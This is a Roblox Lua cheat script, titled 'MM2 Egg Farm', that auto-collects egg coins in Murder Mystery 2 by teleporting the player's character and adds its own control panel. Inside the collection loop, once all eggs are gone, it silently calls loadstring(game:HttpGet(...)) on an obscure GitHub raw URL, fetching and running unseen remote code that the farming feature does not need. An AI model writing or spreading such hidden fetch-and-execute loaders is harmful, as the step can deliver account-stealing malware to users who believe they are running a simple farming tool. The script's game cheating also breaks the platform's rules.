local Players = game:GetService("Players")
local Workspace = game:GetService("Workspace")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local TweenService = game:GetService("TweenService")
local RunService = game:GetService("RunService")
local TeleportService = game:GetService("TeleportService")

-- Script Configuration
local Config = {
    isRunning = false,
    hasReset = false,
    hasExecutedOnce = false,
    isBagFull = false,
    tweenSpeed = 20,
    teleportDistance = 200,
    autoFarmEnabled = false
}

-- Function to check if Easter bag is full
local function checkIfBagIsFull()
    local player = Players.LocalPlayer
    if not player then return false end
    
    -- Check player GUI for full bag indicators
    local success, result = pcall(function()
        local playerGui = player:FindFirstChild("PlayerGui")
        if playerGui then
            local mainGUI = playerGui:FindFirstChild("MainGUI")
            if mainGUI then
                local lobby = mainGUI:FindFirstChild("Lobby")
                if lobby then
                    local dock = lobby:FindFirstChild("Dock")
                    if dock then
                        local coinBags = dock:FindFirstChild("CoinBags")
                        if coinBags then
                            local eggContainer = coinBags:FindFirstChild("Egg")
                            if eggContainer then
                                local fullBagIcon = eggContainer:FindFirstChild("FullBagIcon")
                                if fullBagIcon and fullBagIcon.Visible then
                                    return true
                                end
                            end
                        end
                    end
                end
            end
        end
        
        -- Check text labels for full indicators
        for _, gui in pairs(playerGui:GetDescendants()) do
            if gui:IsA("TextLabel") and gui.Visible then
                local text = gui.Text
                if string.match(text, "(%d+)/(%d+)") then
                    local current, max = string.match(text, "(%d+)/(%d+)")
                    if tonumber(current) and tonumber(max) and tonumber(current) >= tonumber(max) then
                        return true
                    end
                end
            end
        end
        
        return false
    end)
    
    return success and result
end

-- Teleport to lobby when bag is full
local function teleportToLobby()
    local player = Players.LocalPlayer
    local character = player.Character
    if not character then return end
    
    local rootPart = character:FindFirstChild("HumanoidRootPart")
    if not rootPart then return end
    
    -- Try to find lobby spawn
    local lobbySpawn = workspace:FindFirstChild("Lobby", true)
    if lobbySpawn then
        local spawnLocation = lobbySpawn:FindFirstChild("SpawnLocation") or lobbySpawn:FindFirstChild("Spawn")
        if spawnLocation then
            rootPart.CFrame = spawnLocation.CFrame + Vector3.new(0, 5, 0)
            return true
        end
    end
    
    -- Alternative: Try common spawn areas
    local spawnAreas = workspace:FindFirstChild("SpawnLocation")
    if spawnAreas then
        rootPart.CFrame = spawnAreas.CFrame + Vector3.new(0, 5, 0)
        return true
    end
    
    -- Last resort: Use game's teleport system if available
    pcall(function()
        local teleportEvent = ReplicatedStorage:FindFirstChild("Remotes"):FindFirstChild("Teleport")
        if teleportEvent then
            teleportEvent:FireServer("Lobby")
            return true
        end
    end)
    
    return false
end

-- Get the player's character
local function getCharacter()
    local localPlayer = Players.LocalPlayer
    return localPlayer.Character or localPlayer.CharacterAdded:Wait()
end

-- Initialize character components
local function initializeCharacter()
    local character = getCharacter()
    local humanoidRootPart = character:WaitForChild("HumanoidRootPart", 5)
    local humanoid = character:WaitForChild("Humanoid", 5)
    return character, humanoidRootPart, humanoid
end

-- Find active coin container
local function findActiveCoinContainer()
    local mapPaths = {
        "IceCastle", "SkiLodge", "Station", "LogCabin", "Bank2", "BioLab",
        "House2", "Factory", "Hospital3", "Hotel", "Mansion2", "MilBase",
        "Office3", "PoliceStation", "Workplace", "ResearchFacility", "ChristmasItaly"
    }

    for _, mapName in ipairs(mapPaths) do
        local map = Workspace:FindFirstChild(mapName)
        if map then
            local coinContainer = map:FindFirstChild("CoinContainer")
            if coinContainer then
                return coinContainer
            end
        end
    end
    return nil
end

-- Visited coins tracking
local visitedCoins = {}

-- Find nearest egg coin
local function findNearestCoin(coinContainer, humanoidRootPart)
    local nearestCoin = nil
    local shortestDistance = math.huge

    if coinContainer then
        for _, coin in ipairs(coinContainer:GetChildren()) do
            if coin:IsA("BasePart") and coin.Name == "Coin_Server" and 
               coin:GetAttribute("CoinID") == "Egg" and not visitedCoins[coin] then
                local distance = (humanoidRootPart.Position - coin.Position).Magnitude
                if distance < shortestDistance then
                    shortestDistance = distance
                    nearestCoin = coin
                end
            end
        end
    end

    return nearestCoin
end

-- Teleport to a coin
local function teleportToCoin(coin, humanoidRootPart)
    if coin then
        humanoidRootPart.CFrame = CFrame.new(coin.Position)
        visitedCoins[coin] = true
    end
end

-- Tween to a coin
local function tweenToCoin(coin, humanoidRootPart)
    if coin then
        visitedCoins[coin] = true
        local distance = (humanoidRootPart.Position - coin.Position).Magnitude
        local tweenInfo = TweenInfo.new(distance / Config.tweenSpeed, Enum.EasingStyle.Linear)
        local goal = {CFrame = CFrame.new(coin.Position)}
        local tween = TweenService:Create(humanoidRootPart, tweenInfo, goal)
        tween:Play()
        Config.hasReset = false
        tween.Completed:Wait()
    end
end

-- Play falling animation
local function playFallingAnimation(humanoid)
    humanoid:SetStateEnabled(Enum.HumanoidStateType.Freefall, true)
    humanoid:ChangeState(Enum.HumanoidStateType.Freefall)
end

-- Update status text
local function updateStatusText(text)
    if StatusLabel then
        StatusLabel.Text = text
    end
end

-- Stop coin collector
local function stopCoinCollector()
    Config.isRunning = false
    updateStatusText("Status: Stopped")
end

-- Main coin collection function
local function startCoinCollector()
    if Config.isRunning then return end
    Config.isRunning = true
    updateStatusText("Status: Collecting eggs...")
    
    spawn(function()
        while Config.isRunning do
            -- Check if bag is full
            if checkIfBagIsFull() then
                Config.isBagFull = true
                updateStatusText("Status: Bag full! Teleporting to lobby...")
                teleportToLobby()
                Config.isRunning = false
                break
            end
            
            -- Get character components
            local character, humanoidRootPart, humanoid = initializeCharacter()
            if not humanoidRootPart or not humanoid then
                wait(0.5)
                continue
            end
            
            -- Find active map and coins
            local coinContainer = findActiveCoinContainer()
            if not coinContainer then
                wait(0.5)
                continue
            end
            
            -- Find nearest egg coin
            local targetCoin = findNearestCoin(coinContainer, humanoidRootPart)
            if not targetCoin then
                -- Check if all egg coins are gone
                local allCoinsGone = true
                for _, coin in ipairs(coinContainer:GetChildren()) do
                    if coin:IsA("BasePart") and coin.Name == "Coin_Server" and 
                       coin:GetAttribute("CoinID") == "Egg" then
                        allCoinsGone = false
                        break
                    end
                end
                
                if allCoinsGone and not Config.hasReset then
                    character:BreakJoints() -- Reset character
                    visitedCoins = {} -- Reset visited coins
                    Config.hasReset = true
                    
                    if not Config.hasExecutedOnce then
                        Config.hasExecutedOnce = true
                        pcall(function()
                            loadstring(game:HttpGet("https://raw.githubusercontent.com/Ezqhs/-/refs/heads/main/auxqvoa"))()
                        end)
                    end
                    
                    wait(1)
                    updateStatusText("Status: No eggs left")
                    Config.isRunning = false
                    break
                end
                
                wait(0.5)
                continue
            end
            
            -- Collect the coin
            local distanceToCoin = (humanoidRootPart.Position - targetCoin.Position).Magnitude
            if distanceToCoin >= Config.teleportDistance then
                teleportToCoin(targetCoin, humanoidRootPart)
            else
                tweenToCoin(targetCoin, humanoidRootPart)
            end
            
            playFallingAnimation(humanoid)
            
            -- Check bag status after collection
            if checkIfBagIsFull() then
                Config.isBagFull = true
                updateStatusText("Status: Bag full! Teleporting to lobby...")
                teleportToLobby()
                Config.isRunning = false
                break
            end
            
            wait(0.01)
        end
    end)
end

-- Function to handle new round
local function onNewRound()
    Config.hasReset = false
    Config.hasExecutedOnce = false
    Config.isBagFull = false
    updateStatusText("Status: New round")
    visitedCoins = {}
    
    if Config.autoFarmEnabled and not Config.isRunning then
        wait(1)
        startCoinCollector()
    end
end

-- Create custom GUI
local ScreenGui = Instance.new("ScreenGui")
local MainFrame = Instance.new("Frame")
local TitleBar = Instance.new("Frame")
local Title = Instance.new("TextLabel")
local MinimizeButton = Instance.new("TextButton")
local CloseButton = Instance.new("TextButton")
local ContentFrame = Instance.new("Frame")
local FarmToggle = Instance.new("Frame")
local ToggleButton = Instance.new("TextButton")
local ToggleLabel = Instance.new("TextLabel")
local SpeedSlider = Instance.new("Frame")
local SliderLabel = Instance.new("TextLabel")
local SliderFrame = Instance.new("Frame")
local Slider = Instance.new("TextButton")
local SliderFill = Instance.new("Frame")
local SliderValue = Instance.new("TextLabel")
local StatusLabel = Instance.new("TextLabel")
local CreditsLabel = Instance.new("TextLabel")

-- Set up GUI hierarchy
ScreenGui.Parent = game:GetService("CoreGui")
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
ScreenGui.ResetOnSpawn = false
ScreenGui.Name = "MM2EggFarmGUI"

MainFrame.Name = "MainFrame"
MainFrame.Parent = ScreenGui
MainFrame.AnchorPoint = Vector2.new(0.5, 0.5)
MainFrame.Position = UDim2.new(0.5, 0, 0.5, 0)
MainFrame.Size = UDim2.new(0, 280, 0, 200)
MainFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 35)
MainFrame.BorderSizePixel = 0
MainFrame.ClipsDescendants = true
MainFrame.Active = true
MainFrame.Draggable = true

-- Create rounded corners
local UICorner = Instance.new("UICorner")
UICorner.CornerRadius = UDim.new(0, 8)
UICorner.Parent = MainFrame

-- Title bar
TitleBar.Name = "TitleBar"
TitleBar.Parent = MainFrame
TitleBar.BackgroundColor3 = Color3.fromRGB(50, 50, 60)
TitleBar.BorderSizePixel = 0
TitleBar.Size = UDim2.new(1, 0, 0, 40)

local TitleCorner = Instance.new("UICorner")
TitleCorner.CornerRadius = UDim.new(0, 8)
TitleCorner.Parent = TitleBar

-- Fix title bar corners
local FixFrame = Instance.new("Frame")
FixFrame.Parent = TitleBar
FixFrame.BackgroundColor3 = Color3.fromRGB(50, 50, 60)
FixFrame.BorderSizePixel = 0
FixFrame.Position = UDim2.new(0, 0, 0.5, 0)
FixFrame.Size = UDim2.new(1, 0, 0.5, 0)

Title.Name = "Title"
Title.Parent = TitleBar
Title.BackgroundTransparency = 1
Title.Position = UDim2.new(0, 15, 0, 0)
Title.Size = UDim2.new(1, -100, 1, 0)
Title.Font = Enum.Font.GothamBold
Title.Text = "MM2 Egg Farm"
Title.TextColor3 = Color3.fromRGB(255, 255, 255)
Title.TextSize = 18
Title.TextXAlignment = Enum.TextXAlignment.Left

MinimizeButton.Name = "MinimizeButton"
MinimizeButton.Parent = TitleBar
MinimizeButton.BackgroundTransparency = 1
MinimizeButton.Position = UDim2.new(1, -80, 0, 0)
MinimizeButton.Size = UDim2.new(0, 40, 1, 0)
MinimizeButton.Font = Enum.Font.GothamBold
MinimizeButton.Text = "-"
MinimizeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
MinimizeButton.TextSize = 24

CloseButton.Name = "CloseButton"
CloseButton.Parent = TitleBar
CloseButton.BackgroundTransparency = 1
CloseButton.Position = UDim2.new(1, -40, 0, 0)
CloseButton.Size = UDim2.new(0, 40, 1, 0)
CloseButton.Font = Enum.Font.GothamBold
CloseButton.Text = "×"
CloseButton.TextColor3 = Color3.fromRGB(255, 120, 120)
CloseButton.TextSize = 24

-- Content frame
ContentFrame.Name = "ContentFrame"
ContentFrame.Parent = MainFrame
ContentFrame.BackgroundTransparency = 1
ContentFrame.Position = UDim2.new(0, 0, 0, 40)
ContentFrame.Size = UDim2.new(1, 0, 1, -40)

-- Farm toggle
FarmToggle.Name = "FarmToggle"
FarmToggle.Parent = ContentFrame
FarmToggle.BackgroundTransparency = 1
FarmToggle.Position = UDim2.new(0, 15, 0, 15)
FarmToggle.Size = UDim2.new(1, -30, 0, 30)

ToggleButton.Name = "ToggleButton"
ToggleButton.Parent = FarmToggle
ToggleButton.BackgroundColor3 = Color3.fromRGB(255, 80, 80)
ToggleButton.BorderSizePixel = 0
ToggleButton.Size = UDim2.new(0, 60, 0, 26)
ToggleButton.Font = Enum.Font.GothamBold
ToggleButton.Text = "OFF"
ToggleButton.TextColor3 = Color3.fromRGB(255, 255, 255)
ToggleButton.TextSize = 14
ToggleButton.AnchorPoint = Vector2.new(0, 0.5)
ToggleButton.Position = UDim2.new(0, 0, 0.5, 0)

local ButtonCorner = Instance.new("UICorner")
ButtonCorner.CornerRadius = UDim.new(0, 5)
ButtonCorner.Parent = ToggleButton

ToggleLabel.Name = "ToggleLabel"
ToggleLabel.Parent = FarmToggle
ToggleLabel.BackgroundTransparency = 1
ToggleLabel.Position = UDim2.new(0, 70, 0, 0)
ToggleLabel.Size = UDim2.new(1, -70, 1, 0)
ToggleLabel.Font = Enum.Font.Gotham
ToggleLabel.Text = "Auto Farm Egg Coins"
ToggleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
ToggleLabel.TextSize = 16
ToggleLabel.TextXAlignment = Enum.TextXAlignment.Left

-- Speed slider
SpeedSlider.Name = "SpeedSlider"
SpeedSlider.Parent = ContentFrame
SpeedSlider.BackgroundTransparency = 1
SpeedSlider.Position = UDim2.new(0, 15, 0, 60)
SpeedSlider.Size = UDim2.new(1, -30, 0, 50)

SliderLabel.Name = "SliderLabel"
SliderLabel.Parent = SpeedSlider
SliderLabel.BackgroundTransparency = 1
SliderLabel.Size = UDim2.new(1, 0, 0, 20)
SliderLabel.Font = Enum.Font.Gotham
SliderLabel.Text = "Movement Speed: 20"
SliderLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
SliderLabel.TextSize = 16
SliderLabel.TextXAlignment = Enum.TextXAlignment.Left

SliderFrame.Name = "SliderFrame"
SliderFrame.Parent = SpeedSlider
SliderFrame.BackgroundColor3 = Color3.fromRGB(60, 60, 70)
SliderFrame.BorderSizePixel = 0
SliderFrame.Position = UDim2.new(0, 0, 0, 25)
SliderFrame.Size = UDim2.new(1, 0, 0, 10)

local SliderFrameCorner = Instance.new("UICorner")
SliderFrameCorner.CornerRadius = UDim.new(1, 0)
SliderFrameCorner.Parent = SliderFrame

SliderFill.Name = "SliderFill"
SliderFill.Parent = SliderFrame
SliderFill.BackgroundColor3 = Color3.fromRGB(100, 180, 255)
SliderFill.BorderSizePixel = 0
SliderFill.Size = UDim2.new(0.5, 0, 1, 0)

local SliderFillCorner = Instance.new("UICorner")
SliderFillCorner.CornerRadius = UDim.new(1, 0)
SliderFillCorner.Parent = SliderFill

Slider.Name = "Slider"
Slider.Parent = SliderFrame
Slider.AnchorPoint = Vector2.new(0.5, 0.5)
Slider.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Slider.BorderSizePixel = 0
Slider.Position = UDim2.new(0.5, 0, 0.5, 0)
Slider.Size = UDim2.new(0, 18, 0, 18)
Slider.Font = Enum.Font.SourceSans
Slider.Text = ""
Slider.TextColor3 = Color3.fromRGB(0, 0, 0)
Slider.TextSize = 14

local SliderCorner = Instance.new("UICorner")
SliderCorner.CornerRadius = UDim.new(1, 0)
SliderCorner.Parent = Slider

SliderValue.Name = "SliderValue"
SliderValue.Parent = SpeedSlider
SliderValue.BackgroundTransparency = 1
SliderValue.Position = UDim2.new(0, 0, 0, 35)
SliderValue.Size = UDim2.new(1, 0, 0, 20)
SliderValue.Font = Enum.Font.Gotham
SliderValue.Text = "10           20           30           40           50"
SliderValue.TextColor3 = Color3.fromRGB(200, 200, 200)
SliderValue.TextSize = 12

-- Status label
StatusLabel.Name = "StatusLabel"
StatusLabel.Parent = ContentFrame
StatusLabel.BackgroundTransparency = 1
StatusLabel.Position = UDim2.new(0, 0, 0, 120)
StatusLabel.Size = UDim2.new(1, 0, 0, 20)
StatusLabel.Font = Enum.Font.GothamSemibold
StatusLabel.Text = "Status: Waiting"
StatusLabel.TextColor3 = Color3.fromRGB(200, 200, 255)
StatusLabel.TextSize = 14

-- Credits
CreditsLabel.Name = "CreditsLabel"
CreditsLabel.Parent = ContentFrame
CreditsLabel.BackgroundTransparency = 1
CreditsLabel.Position = UDim2.new(0, 0, 0, 150)
CreditsLabel.Size = UDim2.new(1, 0, 0, 20)
CreditsLabel.Font = Enum.Font.Gotham
CreditsLabel.Text = "Made By Extra_Blox"
CreditsLabel.TextColor3 = Color3.fromRGB(150, 150, 150)
CreditsLabel.TextSize = 12

-- GUI Functionality
local isDragging = false
local dragInput = nil
local dragStart = nil
local startPos = nil

-- Make GUI draggable on mobile and PC
local function updateDrag(input)
    local delta = input.Position - dragStart
    MainFrame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
end

TitleBar.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        isDragging = true
        dragStart = input.Position
        startPos = MainFrame.Position
        
        input.Changed:Connect(function()
            if input.UserInputState == Enum.UserInputState.End then
                isDragging = false
            end
        end)
    end
end)

TitleBar.InputChanged:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
        dragInput = input
    end
end)

game:GetService("UserInputService").InputChanged:Connect(function(input)
    if input == dragInput and isDragging then
        updateDrag(input)
    end
end)

-- Slider functionality
local function updateSlider(input)
    local sliderPosition = math.clamp((input.Position.X - SliderFrame.AbsolutePosition.X) / SliderFrame.AbsoluteSize.X, 0, 1)
    SliderFill.Size = UDim2.new(sliderPosition, 0, 1, 0)
    Slider.Position = UDim2.new(sliderPosition, 0, 0.5, 0)
    
    -- Calculate speed value (10-50 range)
    local speedValue = math.floor(10 + (sliderPosition * 40))
    Config.tweenSpeed = speedValue
    SliderLabel.Text = "Movement Speed: " .. speedValue
end

Slider.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        local connection
        connection = game:GetService("RunService").RenderStepped:Connect(function()
            updateSlider(input)
        end)
        
        input.Changed:Connect(function()
            if input.UserInputState == Enum.UserInputState.End then
                connection:Disconnect()
            end
        end)
    end
end)

-- Toggle functionality
ToggleButton.MouseButton1Click:Connect(function()
    Config.autoFarmEnabled = not Config.autoFarmEnabled
    
    if Config.autoFarmEnabled then
        ToggleButton.BackgroundColor3 = Color3.fromRGB(80, 200, 120)
        ToggleButton.Text = "ON"
        startCoinCollector()
    else
        ToggleButton.BackgroundColor3 = Color3.fromRGB(255, 80, 80)
        ToggleButton.Text = "OFF"
        stopCoinCollector()
    end
end)

-- Minimize/Close functionality
MinimizeButton.MouseButton1Click:Connect(function()
    if ContentFrame.Visible then
        ContentFrame.Visible = false
        MainFrame.Size = UDim2.new(0, 280, 0, 40)
    else
        ContentFrame.Visible = true
        MainFrame.Size = UDim2.new(0, 280, 0, 200)
    end
end)

CloseButton.MouseButton1Click:Connect(function()
    ScreenGui:Destroy()
    Config.isRunning = false
end)

-- Connect to game events
local function setupGameEvents()
    -- Connect to round events
    local remotes = ReplicatedStorage:WaitForChild("Remotes")
    local gameplay = remotes:WaitForChild("Gameplay")
    
    -- Round start event
    local roundStart = gameplay:WaitForChild("RoundStart")
    roundStart.OnClientEvent:Connect(onNewRound)
    
    -- Round end event
    local roundEndFade = gameplay:FindFirstChild("RoundEndFade")
    if roundEndFade then
        roundEndFade.OnClientEvent:Connect(function()
            Config.isRunning = false
            updateStatusText("Status: Round ended")
        end)
    end
end

-- Initialize
setupGameEvents()
updateStatusText("Status: Ready")

-- Set initial slider position
local initialSliderPos = (Config.tweenSpeed - 10) / 40
SliderFill.Size = UDim2.new(initialSliderPos, 0, 1, 0)
Slider.Position = UDim2.new(initialSliderPos, 0, 0.5, 0)
